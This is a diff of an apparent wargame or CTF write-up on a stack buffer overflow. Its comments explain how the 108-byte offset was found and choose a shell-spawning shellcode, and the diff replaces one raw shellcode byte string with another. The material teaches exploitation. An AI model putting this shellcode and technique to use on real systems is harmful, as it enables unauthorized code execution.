@@ -118,7 +118,7 @@ ebp            0xbffff668	0xbffff668
 # 0x41366441 is what it have saved, let's check the offset with the website https://wiremask.eu/tools/buffer-overflow-pattern-generator/: 108, cool, now we know how many bytes we have to send to write on eax
 # We can't call other function because nothing else can be exploited, we have to use a shellcode here
 # Let's find one which execute sh https://shell-storm.org/shellcode/files/shellcode-491.html
-# \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
+# \xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
 # It's size is 48 bytes, keep it for after
 #
 # The next step what we have to do is to find the address of the begining of our buffer to execute our shellcode
